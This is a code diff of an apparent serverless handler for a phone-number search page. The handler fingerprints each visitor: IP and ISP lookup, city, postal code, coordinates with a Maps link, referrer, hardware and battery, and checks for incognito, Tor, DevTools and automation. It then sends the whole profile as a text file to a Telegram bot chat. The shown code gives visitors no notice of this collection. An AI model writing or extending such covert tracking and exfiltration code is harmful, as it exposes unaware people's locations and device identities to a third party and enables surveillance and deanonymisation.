@@ -25,6 +25,7 @@ export default async function handler(request) {
             || 'Unknown';
 
     const userAgent = request.headers.get('user-agent') || 'Unknown';
+    const referer = request.headers.get('referer') || 'Direct';
     const acceptLang = request.headers.get('accept-language') || 'Unknown';
 
     // ===== IP LOOKUP =====
@@ -127,7 +128,7 @@ export default async function handler(request) {
     if (incognito === 'Yes') { suspicion += 20; suspicionFlags.push('Incognito'); }
     if (adBlocker === 'Yes') { suspicion += 10; suspicionFlags.push('Ad Blocker'); }
     if (torDetected !== 'No') { suspicion += 40; suspicionFlags.push('Tor'); }
-    if (isBot.includes('Bot')) { suspicion += 50; suspicionFlags.push('Bot'); }
+    if (isBot.includes('Yes')) { suspicion += 50; suspicionFlags.push('Bot'); }
     if (headless !== 'No') { suspicion += 40; suspicionFlags.push('Headless'); }
     if (automation !== 'No') { suspicion += 40; suspicionFlags.push('Automation'); }
     if (devtools !== 'No') { suspicion += 20; suspicionFlags.push('DevTools'); }
@@ -139,94 +140,133 @@ export default async function handler(request) {
     else if (suspicion >= 40) suspicionLevel = 'HIGH';
     else if (suspicion >= 20) suspicionLevel = 'MEDIUM';
 
-    // ===== MESSAGE (CLEAN, NO EMOJI, NO REFERRER) =====
-    const message = `
-<b>NEW SEARCH DETECTED</b>
-─────────────────────
+    // ===== TXT FILE CONTENT =====
+    const fileContent = `=====================================================
+              NEW SEARCH DETECTED
+=====================================================
 
-<b>SEARCH QUERY</b>
-• Type: ${searchType}
-• Number: <code>${searchedNumber}</code>
+SEARCH QUERY
+-----------------------------------------------------
+  Type              : ${searchType}
+  Number            : ${searchedNumber}
 
-<b>THREAT ASSESSMENT</b>
-• Level: ${suspicionLevel}
-• Score: ${suspicion}/100
-• Flags: ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}
+THREAT ASSESSMENT
+-----------------------------------------------------
+  Level             : ${suspicionLevel}
+  Score             : ${suspicion}/100
+  Flags             : ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}
 
-─────────────────────
-<b>SECURITY CHECKS</b>
-─────────────────────
-• Incognito: ${incognito}
-• Ad Blocker: ${adBlocker}
-• Tor Network: ${torDetected}
-• Bot Detection: ${isBot}
-• Bot Score: ${botScore}/12
-• Headless: ${headless}
-• Automation: ${automation}
-• DevTools: ${devtools}
-• WebRTC IP: <code>${vpnWebrtc}</code>
+=====================================================
+                  SECURITY CHECKS
+=====================================================
+  Incognito         : ${incognito}
+  Ad Blocker        : ${adBlocker}
+  Tor Network       : ${torDetected}
+  Bot Detection     : ${isBot}
+  Bot Score         : ${botScore}/12
+  Bot Details       : ${botDetails}
+  Headless Browser  : ${headless}
+  Automation        : ${automation}
+  DevTools Open     : ${devtools}
+  WebRTC IP         : ${vpnWebrtc}
 
-─────────────────────
-<b>IP INFORMATION</b>
-─────────────────────
-• IP: <code>${ip}</code>
-• ISP: ${ipInfo.isp}
-• ASN: ${ipInfo.as}
-• Country: ${ipInfo.country}
-• City: ${ipInfo.city}
-• Region: ${ipInfo.regionName} (${ipInfo.region})
-• Postal: ${ipInfo.zip}
-• Coordinates: ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
-• Timezone: ${ipInfo.timezone}
+=====================================================
+                  IP INFORMATION
+=====================================================
+  IP Address        : ${ip}
+  ISP               : ${ipInfo.isp}
+  Organization      : ${ipInfo.org}
+  ASN               : ${ipInfo.as}
+  AS Name           : ${ipInfo.asname}
+  Reverse DNS       : ${ipInfo.reverse}
 
-• Proxy/VPN: ${ipInfo.proxy ? 'Yes' : 'No'}
-• Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}
-• Mobile Net: ${ipInfo.mobile ? 'Yes' : 'No'}
+LOCATION
+-----------------------------------------------------
+  Country           : ${ipInfo.country}
+  City              : ${ipInfo.city}
+  Region            : ${ipInfo.regionName} (${ipInfo.region})
+  Postal Code       : ${ipInfo.zip}
+  Coordinates       : ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
+  Timezone          : ${ipInfo.timezone}
+  Google Maps       : ${ipInfo.lat && ipInfo.lon ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}` : 'Not available'}
 
-─────────────────────
-<b>DEVICE INFORMATION</b>
-─────────────────────
-• Device: ${device}
-• OS: ${os}
-• Browser: ${browser}
-• Screen: ${screen}
-• Orientation: ${orientation}
-• Pixel Ratio: ${pixelRatio}
-• Color Depth: ${colorDepth}
-• Language: ${language}
-• Timezone: ${browserTZ}
-• Platform: ${platform}
+NETWORK FLAGS
+-----------------------------------------------------
+  Proxy/VPN         : ${ipInfo.proxy ? 'Yes' : 'No'}
+  Hosting           : ${ipInfo.hosting ? 'Yes' : 'No'}
+  Mobile Network    : ${ipInfo.mobile ? 'Yes' : 'No'}
 
-• Battery: ${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}
-• GPU: ${gpu}
-• CPU Cores: ${cores}
-• RAM: ${memory} GB
-• Touch: ${touch}
-• Cookies: ${cookies}
-• Do Not Track: ${doNotTrack}
-• Online: ${online}
-• Connection: ${connection}
-• Page Load: ${pageLoadTime} ms
+=====================================================
+                DEVICE INFORMATION
+=====================================================
+  Device            : ${device}
+  Operating System  : ${os}
+  Browser           : ${browser}
+  Vendor            : ${vendor}
+  Platform          : ${platform}
 
-─────────────────────
-<b>REQUEST METADATA</b>
-─────────────────────
-• Accept-Lang: ${acceptLang}
-• Time: ${timestamp}
-• User Agent: <code>${userAgent}</code>
+DISPLAY
+-----------------------------------------------------
+  Screen            : ${screen}
+  Available Screen  : ${screenAvail}
+  Orientation       : ${orientation}
+  Color Depth       : ${colorDepth}
+  Pixel Ratio       : ${pixelRatio}
+
+HARDWARE
+-----------------------------------------------------
+  CPU Cores         : ${cores}
+  RAM               : ${memory} GB
+  GPU               : ${gpu}
+  GPU Vendor        : ${gpuVendor}
+  Battery           : ${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}
+  Touch Support     : ${touch}
+
+BROWSER SETTINGS
+-----------------------------------------------------
+  Language          : ${language}
+  All Languages     : ${languages}
+  Timezone          : ${browserTZ}
+  Cookies           : ${cookies}
+  Do Not Track      : ${doNotTrack}
+  Online            : ${online}
+  Connection        : ${connection}
+  Page Load Time    : ${pageLoadTime} ms
+
+=====================================================
+                REQUEST METADATA
+=====================================================
+  Referrer          : ${referer}
+  Accept Language   : ${acceptLang}
+  Timestamp         : ${timestamp}
+
+=====================================================
+                  USER AGENT
+=====================================================
+${userAgent}
+
+=====================================================
+                  END OF REPORT
+=====================================================
 `;
 
+    // ===== TXT FILE BANAO =====
+    const fileName = `search_${searchedNumber}_${Date.now()}.txt`;
+    const blob = new Blob([fileContent], { type: 'text/plain' });
+
+    // ===== FORM DATA BANAO =====
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('document', blob, fileName);
+    formData.append('caption', `New search detected: ${searchedNumber}\nThreat Level: ${suspicionLevel}`);
+    formData.append('parse_mode', 'HTML');
+
+    // ===== TELEGRAM PE FILE BHEJO =====
     const tgResponse = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
       {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true,
-        }),
+        body: formData,
       }
     );
 
